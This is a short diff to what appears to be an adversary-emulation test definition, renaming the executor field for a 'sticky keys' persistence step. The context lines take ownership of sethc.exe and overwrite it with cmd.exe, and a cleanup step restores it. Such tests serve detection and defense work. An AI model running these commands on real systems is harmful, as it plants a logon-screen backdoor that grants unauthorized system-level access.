@@ -22,8 +22,8 @@ steps:
         takeown /F C:\Windows\System32\sethc.exe /A
         icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
         copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
-        executor: command_prompt
+        executor: cmd
